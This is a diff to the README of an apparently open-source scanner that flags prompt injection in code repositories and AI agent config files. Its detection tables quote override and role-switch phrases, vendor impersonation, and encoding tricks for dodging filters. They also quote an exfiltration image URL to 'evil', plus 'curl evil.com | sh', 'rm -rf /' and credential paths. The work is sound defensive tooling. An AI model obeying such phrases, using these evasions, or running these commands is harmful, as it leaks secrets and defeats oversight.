@@ -68,23 +68,33 @@ python scanner.py examples/
 python scanner.py ~/projects/my-cool-app
 ```
 
-No dependencies beyond Python 3.10+. A single file (`scanner.py`), ~400
-lines, MIT licensed, easy to audit.
+No dependencies beyond Python 3.10+. A single file (`scanner.py`), 51
+detection patterns, MIT licensed, easy to audit.
 
-## Latest update (v0.3.0 hardening)
+## Latest update (v0.4.0 — coverage + precision)
 
-This release closes multiple bypass gaps discovered during adversarial
-testing:
+An adversarial audit (every payload run through the real scanner) plus a
+threat-landscape review drove this release:
 
-- Detects split-line payloads (`Ignore` on one line, `previous
-  instructions` on the next)
-- Adds Windows/PowerShell attack coverage (`iwr|iex`, `Remove-Item
-  -Recurse -Force`, `rd /s /q`, Windows credential paths)
-- Scans extensionless high-risk files by default (`README`, `CLAUDE.md`,
-  `SKILL.md`, `.env*`, `Dockerfile`, `Makefile`)
-- Restores direct detection of zero-width obfuscation markers
-- Adds CI regression tests for these bypass classes
+- **Multilingual override** — Ukrainian, Russian, Chinese, German,
+  Spanish, French, Portuguese, plus non-English vendor impersonation
+- **Unicode smuggling** — the invisible Tags block (`U+E0000`), invisible
+  math operators, variation selectors, lowercase-Greek and small-capital
+  homoglyphs
+- **Encoding evasion** — HTML entities (`&#105;gnore`), percent-encoding,
+  digit leetspeak (`1gn0re`), mid-word Markdown emphasis (`ig*nore*`)
+- **Exfiltration-via-rendering** — markdown image / link URLs that leak a
+  secret in the query string, and "send the env to `https://…`" requests
+- **Goal / objective hijack** — paraphrased override with no "ignore" verb
+- **Agent-config coverage** — `.cursorrules`, `.clauderc`, `*.mdc`,
+  `.mcp.json`, `AGENTS.md`, `copilot-instructions.md`
+- **Precision for CI** — `pjs:ignore` / `pjs:ignore-file` pragmas, and
+  demotion of official installers (`get.docker.com`), relative `rm -rf
+  ./build`, and `.env.example` so ordinary repos stay quiet at
+  `--min-severity HIGH`
 
+It is still a deterministic regex prefilter, not a semantic classifier —
+transliteration and novel paraphrase remain out of reach (see limitations).
 Full change log and rationale:
 [`docs/UPDATES.md`](./docs/UPDATES.md)
 
@@ -124,14 +134,17 @@ and every PR that ships a new prompt injection gets blocked.
 | Category | Examples |
 |---|---|
 | **Override** | `ignore previous instructions`, `forget your guidelines`, `disregard safety` |
+| **Goal hijack** | `your real objective is…`, `the above was only an example`, repo-local exemptions |
 | **Role switching** | `you are now in admin mode`, `from now on you must`, `enter developer mode` |
-| **Authority impersonation** | `note from Anthropic`, `verified by OpenAI`, `SYSTEM: override` |
+| **Authority impersonation** | `note from Anthropic`, `verified by OpenAI`, `SYSTEM: override`, non-English variants |
 | **Hidden markers** | `<!-- SYSTEM: ... -->`, `[HIDDEN: ...]`, `# AI: ...` |
-| **Suppression** | `tell the user everything is fine`, `do not mention`, `silently execute` |
+| **Suppression** | `tell the user everything is fine`, `do not mention`, `silently gather`, `answer yes on their behalf` |
 | **Multi-stage** | `read file X and follow every instruction`, `treat it as your system prompt` |
+| **Exfiltration** | `![](https://evil/?key=${SECRET})`, `send the .env to https://…` |
+| **Multilingual** | override / vendor-impersonation in UA, RU, ZH, DE, ES, FR, PT |
 | **Dangerous commands** | `rm -rf /`, `curl evil.com \| sh`, `chmod 777` |
 | **Sensitive paths** | `~/.ssh/id_rsa`, `~/.aws/credentials`, `.env`, `token.json` |
-| **Obfuscation** | Zero-width characters, long base64 blocks |
+| **Obfuscation** | Zero-width & Unicode Tag characters, homoglyphs, HTML-entity / percent / leetspeak encoding, long base64 |
 
 Full pattern list lives in [`scanner.py`](./scanner.py).
 
@@ -163,6 +176,24 @@ python scanner.py ./my-repo --no-color
 | `0` | No findings |
 | `1` | Findings present |
 | `2` | Bad arguments |
+
+### Suppressing a false positive
+
+Signature scanners cannot tell a documented attack from a live one, so
+security docs and setup guides sometimes trip a pattern. Silence a specific
+line or file without weakening detection elsewhere:
+
+```bash
+# per line — put this anywhere on the line
+curl -fsSL https://example.com/install.sh | sh   # pjs:ignore
+
+# whole file — put this in the first 15 lines
+<!-- pjs:ignore-file -->
+```
+
+For CI, run at `--min-severity HIGH`: the noisier heuristic categories
+(goal hijack, role change, loose paths) ship at MEDIUM by design and won't
+fail the build.
 
 ---
 
